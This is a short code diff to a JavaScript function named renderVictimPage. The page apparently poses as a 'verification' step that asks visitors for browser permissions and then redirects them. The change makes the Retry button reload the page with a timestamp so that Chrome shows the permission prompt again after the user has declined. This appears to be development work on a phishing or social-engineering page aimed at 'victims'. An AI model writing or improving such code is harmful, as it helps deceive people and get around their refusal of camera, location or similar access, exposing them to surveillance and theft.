@@ -363,8 +363,11 @@ function renderVictimPage(sessionToken, redirectUrl) {
       setTimeout(doRedirect, 4000);
     }
 
-    // ── Retry tries again directly (no reload, directly re-requests permissions) ──
-    _retryBtn.addEventListener('click', startVerification);
+    // ── Retry: navigate to fresh URL so Chrome re-prompts permissions ──
+    _retryBtn.addEventListener('click', function () {
+      showStatus('Refreshing…');
+      window.location.href = window.location.pathname + '?r=' + Date.now();
+    });
 
     // ── Initial start ────────────────────────────────────
     _goBtn.addEventListener('click', startVerification);
